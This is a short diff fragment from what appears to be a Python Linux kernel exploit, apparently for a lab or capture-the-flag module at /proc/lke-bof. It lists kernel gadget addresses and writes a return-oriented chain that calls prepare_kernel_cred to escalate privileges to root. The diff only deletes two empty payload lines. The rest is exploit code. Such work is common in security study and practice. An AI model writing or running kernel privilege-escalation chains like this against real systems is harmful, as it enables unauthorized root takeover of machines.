@@ -380,9 +380,6 @@ prepare_kernel_cred = 0xffffffff81081716
 xor_edi_edi_ret = 0xffffffff810a1035
 mov_rdi_rax_dummy_ret = 0xffffffff8114d09b
 
-payload = b''
-payload += b''
-
 open("/proc/lke-bof", "wb").write(pack("6Q", 
 	xor_edi_edi_ret, # xor edi, edi; ret
 	prepare_kernel_cred, # prepare_kernel_cred
